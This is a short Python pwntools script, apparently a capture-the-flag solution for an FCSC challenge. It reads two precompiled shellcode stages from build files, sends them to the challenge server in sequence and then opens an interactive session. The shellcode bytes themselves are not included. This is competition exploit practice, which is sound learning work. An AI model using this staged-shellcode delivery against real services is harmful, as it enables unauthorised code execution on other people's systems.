from pwn import *
from time import sleep

# DEBUG = True
DEBUG = False

# Load shellcodes
shellcode_stage0 = b""
shellcode_stage1 = b""
try:
    f = open("./build/stage0.bin", "rb")
    shellcode_stage0 = f.read()
    f.close()
    f = open("./build/stage1.bin", "rb")
    shellcode_stage1 = f.read()
    f.close()
except Exception:
    print("Please compile shellcodes first")
    exit(-1)

if DEBUG:
    p = remote("localhost", 4000)
else:
    p = remote("chall.fcsc.fr", 2101)

sleep(1)
p.send(shellcode_stage0)
sleep(1)
p.send(shellcode_stage1)
p.interactive()
